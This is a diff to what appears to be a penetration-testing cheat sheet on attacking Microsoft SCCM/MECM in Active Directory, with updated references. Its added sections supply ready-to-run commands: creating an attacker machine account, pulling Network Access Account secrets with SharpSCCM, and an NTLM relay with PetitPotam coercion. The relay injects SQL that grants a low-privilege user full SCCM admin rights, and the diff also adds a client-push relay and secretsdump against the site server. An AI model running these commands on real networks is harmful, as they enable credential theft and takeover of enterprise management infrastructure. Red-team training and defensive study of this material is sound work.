@@ -83,6 +83,15 @@
     MalSCCM.exe group /delete /groupname:TargetGroup
     ```
 
+## SCCM Enumeration
+
+* [garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter) - SCCMHunter is a post-ex tool built to streamline identifying, profiling, and attacking SCCM related assets in an Active Directory domain.
+
+    ```ps1
+    sccmhunter.py find -u user -p P@ssw0rd -dc-ip 10.10.10.10 -d lab.lan
+    sccmhunter.py show -siteservers
+    ```
+
 ## SCCM Shares
 
 > Find interesting files stored on (System Center) Configuration Manager (SCCM/CM) SMB shares
@@ -97,7 +106,7 @@
 
 ## SCCM Configuration Manager
 
-* [subat0mik/Misconfiguration-Manager/MisconfigurationManager.ps1](https://raw.githubusercontent.com/subat0mik/Misconfiguration-Manager/main/MisconfigurationManager.ps1)
+* [subat0mik/Misconfiguration-Manager/MisconfigurationManager.ps1](https://github.com/subat0mik/Misconfiguration-Manager) - Misconfiguration Manager is a central knowledge base for all known Microsoft Configuration Manager tradecraft and associated defensive and hardening guidance.
 
 ### CRED-1 Retrieve credentials via PXE boot media
 
@@ -135,8 +144,10 @@ Create a machine or compromise an existing one, then request policies such as `N
 Easy mode using `SharpSCCM`
 
 ```ps1
-SharpSCCM get secrets -u <username-machine-$> -p <password>
+addcomputer.py -computer-name 'attacker$' -computer-pass P@ssw0rd -dc-ip 10.10.10.10 lab.lan/user:'P@ssw0rd'
+SharpSCCM.exe get naa -r newdevice -u attacker$ -p P@ssw0rd
 SharpSCCM get naa
+SharpSCCM get secrets -u <username-machine-$> -p <password>
 ```
 
 Stealthy mode by creating a computer.
@@ -270,10 +281,25 @@ SQL> select name from sysdatabases where name like 'CM_%'
 
 **Exploitation**:
 
-* Generate the query to elevate our user: `python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab -dc-ip 192.168.33.10 -debug -tu carol -sc P01 -stacked`
-* Setup a relay with the generated query: `ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x01050000000000051500000058ED3FD3BF25B04EDE28E7B85A040000,'SCCMLAB\carol',0,0,'','','','','P01');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00004','1');"`
-* Coerce an authentication to your listener using a domain account: `petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11`
-* Finally, connect as admin on the MSSQL server: `python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11`
+* Generate the query to elevate our user: 
+    ```ps1
+    python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab -dc-ip 192.168.33.10 -debug -tu carol -sc P01 -stacked
+    ```
+
+* Setup a relay with the generated query: 
+    ```ps1
+    ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x01050000000000051500000058ED3FD3BF25B04EDE28E7B85A040000,'SCCMLAB\carol',0,0,'','','','','P01');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00004','1');"
+    ```
+
+* Coerce an authentication to your listener using a domain account: 
+    ```ps1
+    petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11
+    ```
+
+* Finally, connect as admin on the MSSQL server: 
+    ```ps1
+    python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11
+    ```
 
 ### TAKEOVER2 - Low Privileges to MECM Admin Account - SMB relay
 
@@ -289,6 +315,21 @@ Microsoft requires the site server's computer account to be an administrator on 
     proxychains -q smbexec.py -no-pass SCCMLAB/'MECM$'@192.168.33.12 
     proxychains -q secretsdump.py -no-pass SCCMLAB/'MECM$'@192.168.33.12 
     ```
+
+### ELEVATE 2 - NTLM Relay with Automatic Client Push Authentication
+
+**Requirements**:
+
+* Automatic site-wide client push installation enabled
+* Automatic site device approval
+* Fallback authentication to NTLM
+
+**Exploitation**:
+
+```ps1
+SharpSCCM.exe invoke client-push -t 192.168.1.50
+ntlmrelayx.py -t mssql01.lab.lan -smb2support
+```
 
 ## SCCM Persistence
 
@@ -310,17 +351,18 @@ CcmExec is a service native to SCCM Windows clients that is executed on every in
 
 ## References
 
-* [Network Access Accounts are evil… - Roger Zander - September 13, 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
-* [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - June 28, 2022](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
-* [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
+* [Attacking and Defending Configuration Manager - An Attackers Easy Win - Logan Goins - April 25, 2025](https://logan-goins.com/2025-04-25-sccm/)
+* [Decrypting the Forest From the Trees - Garrett Foster - March 6, 2025](https://specterops.io/blog/2025/03/06/decrypting-the-forest-from-the-trees/)
 * [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - May 13, 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
 * [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - July 9, 2022](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
-* [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - June 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
+* [Further Adventures With CMPivot — Client Coercion - Diego Lomellini - February 3, 2025](https://posts.specterops.io/further-adventures-with-cmpivot-client-coercion-38b878b740ac)
+* [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
 * [Misconfiguration Manager: Overlooked and Overprivileged - Duane Michael - March 5, 2024](https://posts.specterops.io/misconfiguration-manager-overlooked-and-overprivileged-70983b8f350d)
-* [SeeSeeYouExec: Windows Session Hijacking via CcmExec - Andrew Oliveau - March 28, 2024](https://cloud.google.com/blog/topics/threat-intelligence/windows-session-hijacking-via-ccmexec?hl=en)
+* [Network Access Accounts are evil… - Roger Zander - September 13, 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
+* [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - June 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
 * [SCCM / MECM LAB - Part 0x0 - mayfly - March 23, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x0/)
 * [SCCM / MECM LAB - Part 0x1 - Recon and PXE - mayfly - March 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x1/)
 * [SCCM / MECM LAB - Part 0x2 - Low user - mayfly - March 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x2/)
 * [SCCM / MECM LAB - Part 0x3 - Admin User - mayfly - April 3, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x3/)
-* [Further Adventures With CMPivot — Client Coercion - Diego Lomellini - February 3, 2025](https://posts.specterops.io/further-adventures-with-cmpivot-client-coercion-38b878b740ac)
-* [Decrypting the Forest From the Trees - Garrett Foster - March 6, 2025](https://specterops.io/blog/2025/03/06/decrypting-the-forest-from-the-trees/)
+* [SeeSeeYouExec: Windows Session Hijacking via CcmExec - Andrew Oliveau - March 28, 2024](https://cloud.google.com/blog/topics/threat-intelligence/windows-session-hijacking-via-ccmexec?hl=en)
+* [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - June 28, 2022](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
